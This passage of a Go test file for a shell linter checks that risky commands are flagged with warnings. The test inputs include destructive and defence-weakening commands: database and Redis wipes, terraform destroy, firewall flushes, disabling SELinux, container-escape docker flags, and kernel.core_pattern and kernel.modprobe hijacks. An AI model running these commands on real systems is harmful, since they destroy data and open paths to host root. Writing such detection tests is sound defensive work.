			violations := testutil.Check(tt.input, "ZC1437")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1438(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — systemctl disable",
			input:    `systemctl disable some.service`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — systemctl mask",
			input: `systemctl mask some.service`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1438",
					Message: "`systemctl mask` permanently blocks service start. If this is a policy choice, document the `unmask` path. For a softer block, use `disable`.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1438")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1439(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — sysctl vm.swappiness=10",
			input:    `sysctl vm.swappiness=10`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — sysctl ip_forward=1",
			input: `sysctl net.ipv4.ip_forward=1`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1439",
					Message: "Enabling `ip_forward` turns the host into a router. Verify firewall posture (iptables/nftables) and persist the setting in `/etc/sysctl.d/`.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1439")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1440(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — usermod -aG (append)",
			input:    `usermod -aG docker alice`,
			expected: []katas.Violation{},
		},
		{
			name:     "valid — usermod -L (lock)",
			input:    `usermod -L alice`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — usermod -G (replace)",
			input: `usermod -G docker alice`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1440",
					Message: "`usermod -G` without `-a` overwrites supplementary groups. Use `-aG` to append — existing memberships are preserved.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1440")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1441(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — docker ps",
			input:    `docker ps`,
			expected: []katas.Violation{},
		},
		{
			name:     "valid — docker prune (no -af)",
			input:    `docker system prune`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — docker system prune -af",
			input: `docker system prune -a -f`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1441",
					Message: "`docker prune -af` / `-a --force` deletes all unused resources without prompt. Scope with `--filter` or target one resource type.",
					Line:    1,
					Column:  1,
				},
			},
		},
		{
			name:  "invalid — docker prune -af combined",
			input: `docker prune -af`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1441",
					Message: "`docker prune -af` / `-a --force` deletes all unused resources without prompt. Scope with `--filter` or target one resource type.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1441")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1442(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — kubectl get pods",
			input:    `kubectl get pods`,
			expected: []katas.Violation{},
		},
		{
			name:     "valid — kubectl delete specific pod",
			input:    `kubectl delete pod myapp-abc123`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — kubectl delete --all pods",
			input: `kubectl delete pods --all`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1442",
					Message: "`kubectl delete --all` (or `-A`) deletes resources cluster-wide. Dry-run with `--dry-run=client -o yaml` first, and scope with `-n` namespace.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1442")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1443(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — terraform plan",
			input:    `terraform plan`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — terraform destroy",
			input: `terraform destroy`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1443",
					Message: "`terraform destroy` without `-target` removes every resource in state. Scope with `-target=...` or gate behind interactive confirmation.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1443")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1444(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — redis-cli GET",
			input:    `redis-cli GET foo`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — redis-cli FLUSHALL",
			input: `redis-cli FLUSHALL`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1444",
					Message: "`redis-cli FLUSHALL`/`FLUSHDB` wipes Redis data. Disable via `rename-command` in redis.conf on production, or require explicit confirmation.",
					Line:    1,
					Column:  1,
				},
			},
		},
		{
			name:  "invalid — redis-cli FLUSHDB",
			input: `redis-cli FLUSHDB`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1444",
					Message: "`redis-cli FLUSHALL`/`FLUSHDB` wipes Redis data. Disable via `rename-command` in redis.conf on production, or require explicit confirmation.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1444")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1445(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — mysqladmin ping",
			input:    `mysqladmin ping`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — dropdb",
			input: `dropdb mydb`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1445",
					Message: "`dropdb` removes a PostgreSQL database. Verify target and backup first (`pg_dump`).",
					Line:    1,
					Column:  1,
				},
			},
		},
		{
			name:  "invalid — mysqladmin drop",
			input: `mysqladmin drop mydb`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1445",
					Message: "`mysqladmin drop` removes a MySQL database. Verify target and backup first (`mysqldump`).",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1445")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1446(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — aws s3 ls",
			input:    `aws s3 ls`,
			expected: []katas.Violation{},
		},
		{
			name:     "valid — aws s3 cp",
			input:    `aws s3 cp local remote`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — aws s3 rm --recursive",
			input: `aws s3 rm prefix --recursive`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1446",
					Message: "`aws s3 rm --recursive` / `s3 rb --force` mass-deletes objects/buckets. Enable versioning and dry-run with `--dryrun`.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1446")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1447(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — ip addr",
			input:    `ip addr show`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — ifconfig",
			input: `ifconfig eth0`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1447",
					Message: "`ifconfig` is deprecated. Use `ip addr` / `ip link` / `ip route` from iproute2.",
					Line:    1,
					Column:  1,
				},
			},
		},
		{
			name:  "invalid — netstat",
			input: `netstat -tuln`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1447",
					Message: "`netstat` is deprecated. Use `ss` from iproute2 (same flags, faster output).",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1447")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1448(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — apt-get install -y",
			input:    `apt-get install -y curl`,
			expected: []katas.Violation{},
		},
		{
			name:     "valid — apt-get update (not install)",
			input:    `apt-get update`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — apt-get install without -y",
			input: `apt-get install curl`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1448",
					Message: "`apt-get install`/`apt install` without `-y` hangs on the interactive prompt in scripts. Add `-y` and set DEBIAN_FRONTEND=noninteractive.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1448")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1449(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — dnf install -y",
			input:    `dnf install -y vim`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — dnf install no -y",
			input: `dnf install vim`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1449",
					Message: "`dnf` without `-y` hangs on confirmation. Add `-y` for unattended runs.",
					Line:    1,
					Column:  1,
				},
			},
		},
		{
			name:  "invalid — yum install no -y",
			input: `yum install httpd`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1449",
					Message: "`yum` without `-y` hangs on confirmation. Add `-y` for unattended runs.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1449")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1450(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — pacman -Ss (search)",
			input:    `pacman -Ss vim`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — pacman -S without --noconfirm",
			input: `pacman -S vim`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1450",
					Message: "`pacman -S` without `--noconfirm` hangs in scripts.",
					Line:    1,
					Column:  1,
				},
			},
		},
		{
			name:  "invalid — zypper install without -n",
			input: `zypper install vim`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1450",
					Message: "`zypper install` without `--non-interactive` (`-n`) hangs in scripts.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1450")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1451(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — pip install --user",
			input:    `pip install --user requests`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — pip install (system-wide)",
			input: `pip install requests`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1451",
					Message: "`pip install` without `--user` or an active venv targets system Python. Use `python -m venv` / `uv` / `--user` for scoped installs.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1451")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1452(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — npm install local",
			input:    `npm install react`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — npm install -g",
			input: `npm install -g typescript`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1452",
					Message: "`npm install -g` installs system-wide. Prefer project-local install or `npx`/`pnpm dlx` for one-off tools.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1452")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1453(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — sudo apt-get install",
			input:    `sudo apt-get install -y curl`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — sudo pip install",
			input: `sudo pip install requests`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1453",
					Message: "`sudo pip` runs a language package manager as root. Prefer `--user`, a virtualenv/venv, or a version manager (nvm/pyenv/rbenv).",
					Line:    1,
					Column:  1,
				},
			},
		},
		{
			name:  "invalid — sudo npm install -g",
			input: `sudo npm install -g ts-node`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1453",
					Message: "`sudo npm` runs a language package manager as root. Prefer `--user`, a virtualenv/venv, or a version manager (nvm/pyenv/rbenv).",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1453")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1454(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — docker run alpine",
			input:    `docker run alpine echo hi`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — docker run --privileged",
			input: `docker run --privileged alpine sh`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1454",
					Message: "`--privileged` disables container isolation — effectively host root. Use `--cap-add` + `--device` for narrow permissions.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1454")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1455(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — docker run isolated",
			input:    `docker run -p 8080:80 alpine`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — docker run --net=host",
			input: `docker run --net=host alpine`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1455",
					Message: "`--net=host` / `--network=host` lets the container reach host-local services. Use `-p` for explicit publishes or dedicated container networks.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1455")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1456(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — docker run -v local mount",
			input:    `docker run -v data:/app alpine`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — docker run -v /:/host",
			input: `docker run -v /:/host alpine`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1456",
					Message: "`-v /:...` mounts the host root into the container — trivial container escape. Scope to specific paths.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1456")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1457(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — docker run normal mount",
			input:    `docker run -v data:/app alpine`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — docker run with docker.sock mount",
			input: `docker run -v docker.sock:/var/run/docker.sock alpine`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1457",
					Message: "Mounting `/var/run/docker.sock` gives the container effective root on the host. Reserve for trusted tooling.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1457")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1458(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — docker run --user nobody",
			input:    `docker run --user 1000 alpine`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — docker run --user root",
			input: `docker run --user root alpine`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1458",
					Message: "Explicit root UID inside a container lets container-escape bugs become host root. Use a non-root USER in the image.",
					Line:    1,
					Column:  1,
				},
			},
		},
		{
			name:  "invalid — docker run --user 0",
			input: `docker run --user 0 alpine`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1458",
					Message: "Explicit root UID inside a container lets container-escape bugs become host root. Use a non-root USER in the image.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1458")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1459(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — docker run --cap-add=NET_BIND_SERVICE",
			input:    `docker run --cap-add=NET_BIND_SERVICE alpine`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — docker run --cap-add=SYS_ADMIN (equals form)",
			input: `docker run --cap-add=SYS_ADMIN alpine`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1459",
					Message: "Dangerous Linux capability granted — breaks the container's security boundary. Prefer `--cap-drop=ALL` and add back only minimum needed.",
					Line:    1,
					Column:  1,
				},
			},
		},
		{
			name:  "invalid — docker run --cap-add SYS_PTRACE (space form)",
			input: `docker run --cap-add SYS_PTRACE alpine`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1459",
					Message: "Dangerous Linux capability granted — breaks the container's security boundary. Prefer `--cap-drop=ALL` and add back only minimum needed.",
					Line:    1,
					Column:  1,
				},
			},
		},
		{
			name:  "invalid — podman run --cap-add=ALL",
			input: `podman run --cap-add=ALL alpine`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1459",
					Message: "Dangerous Linux capability granted — breaks the container's security boundary. Prefer `--cap-drop=ALL` and add back only minimum needed.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1459")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1460(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — docker run with no security-opt",
			input:    `docker run alpine`,
			expected: []katas.Violation{},
		},
		{
			name:     "valid — docker run --security-opt=no-new-privileges",
			input:    `docker run --security-opt=no-new-privileges alpine`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — docker run --security-opt seccomp=unconfined (space form)",
			input: `docker run --security-opt seccomp=unconfined alpine`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1460",
					Message: "Disabling seccomp or AppArmor removes the main syscall/MAC filter that blocks container escapes. Keep the default profile.",
					Line:    1,
					Column:  1,
				},
			},
		},
		{
			name:  "invalid — docker run --security-opt=apparmor=unconfined (equals form)",
			input: `docker run --security-opt=apparmor=unconfined alpine`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1460",
					Message: "Disabling seccomp or AppArmor removes the main syscall/MAC filter that blocks container escapes. Keep the default profile.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1460")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1461(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — docker run without --pid",
			input:    `docker run alpine`,
			expected: []katas.Violation{},
		},
		{
			name:     "valid — docker run --pid=container:other",
			input:    `docker run --pid=container:abc alpine`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — docker run --pid=host (equals form)",
			input: `docker run --pid=host alpine`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1461",
					Message: "`--pid=host` shares the host PID namespace — container can signal and inspect every host process. Avoid outside debug tools.",
					Line:    1,
					Column:  1,
				},
			},
		},
		{
			name:  "invalid — podman run --pid host (space form)",
			input: `podman run --pid host alpine`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1461",
					Message: "`--pid=host` shares the host PID namespace — container can signal and inspect every host process. Avoid outside debug tools.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1461")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1462(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — docker run without --ipc",
			input:    `docker run alpine`,
			expected: []katas.Violation{},
		},
		{
			name:     "valid — docker run --ipc=shareable",
			input:    `docker run --ipc=shareable alpine`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — docker run --ipc=host (equals form)",
			input: `docker run --ipc=host alpine`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1462",
					Message: "`--ipc=host` shares host shared memory and SysV IPC with the container — trivial data theft and side-channel vector. Use the default private IPC.",
					Line:    1,
					Column:  1,
				},
			},
		},
		{
			name:  "invalid — podman run --ipc host (space form)",
			input: `podman run --ipc host alpine`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1462",
					Message: "`--ipc=host` shares host shared memory and SysV IPC with the container — trivial data theft and side-channel vector. Use the default private IPC.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1462")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1463(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — docker run without --userns",
			input:    `docker run alpine`,
			expected: []katas.Violation{},
		},
		{
			name:     "valid — docker run --userns=keep-id",
			input:    `podman run --userns=keep-id alpine`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — docker run --userns=host",
			input: `docker run --userns=host alpine`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1463",
					Message: "`--userns=host` disables user-namespace remap — UID 0 in the container == UID 0 on the host. Leave the default remap on.",
					Line:    1,
					Column:  1,
				},
			},
		},
		{
			name:  "invalid — podman run --userns host",
			input: `podman run --userns host alpine`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1463",
					Message: "`--userns=host` disables user-namespace remap — UID 0 in the container == UID 0 on the host. Leave the default remap on.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1463")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1464(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — iptables -A INPUT -j DROP",
			input:    `iptables -A INPUT -j DROP`,
			expected: []katas.Violation{},
		},
		{
			name:     "valid — iptables -P INPUT DROP",
			input:    `iptables -P INPUT DROP`,
			expected: []katas.Violation{},
		},
		{
			name:     "valid — iptables-save > backup",
			input:    `iptables -S`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — iptables -F (flush all)",
			input: `iptables -F`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1464",
					Message: "Firewall hardening weakened (flushing all firewall rules). Keep default-drop and use atomic reload.",
					Line:    1,
					Column:  1,
				},
			},
		},
		{
			name:  "invalid — iptables -P INPUT ACCEPT",
			input: `iptables -P INPUT ACCEPT`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1464",
					Message: "Firewall hardening weakened (default-ACCEPT policy on INPUT chain). Keep default-drop and use atomic reload.",
					Line:    1,
					Column:  1,
				},
			},
		},
		{
			name:  "invalid — ip6tables -F",
			input: `ip6tables -F`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1464",
					Message: "Firewall hardening weakened (flushing all firewall rules). Keep default-drop and use atomic reload.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1464")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1465(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — setenforce 1",
			input:    `setenforce 1`,
			expected: []katas.Violation{},
		},
		{
			name:     "valid — setenforce Enforcing",
			input:    `setenforce Enforcing`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — setenforce 0",
			input: `setenforce 0`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1465",
					Message: "`setenforce 0` disables SELinux enforcement host-wide. Fix the AVC with `audit2allow` instead and keep enforcing mode on.",
					Line:    1,
					Column:  1,
				},
			},
		},
		{
			name:  "invalid — setenforce Permissive",
			input: `setenforce Permissive`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1465",
					Message: "`setenforce 0` disables SELinux enforcement host-wide. Fix the AVC with `audit2allow` instead and keep enforcing mode on.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1465")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1466(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — ufw allow 22",
			input:    `ufw allow 22`,
			expected: []katas.Violation{},
		},
		{
			name:     "valid — systemctl start firewalld",
			input:    `systemctl start firewalld`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — ufw disable",
			input: `ufw disable`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1466",
					Message: "Host firewall disabled (ufw disable). Keep it on and open specific ports.",
					Line:    1,
					Column:  1,
				},
			},
		},
		{
			name:  "invalid — systemctl stop firewalld",
			input: `systemctl stop firewalld`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1466",
					Message: "Host firewall disabled (systemctl stop firewalld). Keep it on and open specific ports.",
					Line:    1,
					Column:  1,
				},
			},
		},
		{
			name:  "invalid — systemctl mask ufw.service",
			input: `systemctl mask ufw.service`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1466",
					Message: "Host firewall disabled (systemctl mask ufw.service). Keep it on and open specific ports.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1466")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1467(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — sysctl -w vm.swappiness=10",
			input:    `sysctl -w vm.swappiness=10`,
			expected: []katas.Violation{},
		},
		{
			name:     "valid — sysctl -w kernel.core_pattern=core",
			input:    `sysctl -w kernel.core_pattern=core`,
			expected: []katas.Violation{},
		},
		{
			name:     "valid — sysctl -w kernel.modprobe=/sbin/modprobe",
			input:    `sysctl -w kernel.modprobe=/sbin/modprobe`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — sysctl -w 'kernel.core_pattern=|/tmp/x'",
			input: `sysctl -w 'kernel.core_pattern=|/tmp/x'`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1467",
					Message: "Kernel hijack vector (kernel.core_pattern pipe handler) — next crash / module load runs attacker-supplied binary as root.",
					Line:    1,
					Column:  1,
				},
			},
		},
		{
			name:  "invalid — sysctl -w kernel.modprobe=/tmp/foo",
			input: `sysctl -w kernel.modprobe=/tmp/foo`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1467",
					Message: "Kernel hijack vector (kernel.modprobe override) — next crash / module load runs attacker-supplied binary as root.",
					Line:    1,
					Column:  1,
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			violations := testutil.Check(tt.input, "ZC1467")
			testutil.AssertViolations(t, tt.input, violations, tt.expected)
		})
	}
}

func TestZC1468(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected []katas.Violation
	}{
		{
			name:     "valid — apt-get install curl",
			input:    `apt-get install curl`,
			expected: []katas.Violation{},
		},
		{
			name:     "valid — apt-get install -y curl",
			input:    `apt-get install -y curl`,
			expected: []katas.Violation{},
		},
		{
			name:  "invalid — apt-get install --allow-unauthenticated curl",
			input: `apt-get install --allow-unauthenticated curl`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1468",
					Message: "APT installing unsigned or override-policy packages (--allow-unauthenticated) — disables signature verification, MITM-to-root trivial.",
					Line:    1,
					Column:  1,
				},
			},
		},
		{
			name:  "invalid — apt-get install --force-yes foo",
			input: `apt-get install --force-yes foo`,
			expected: []katas.Violation{
				{
					KataID:  "ZC1468",
					Message: "APT installing unsigned or override-policy packages (--force-yes) — disables signature verification, MITM-to-root trivial.",
					Line:    1,
					Column:  1,
				},
			},
		},
		{
			name:  "invalid — apt install --allow-downgrades foo",
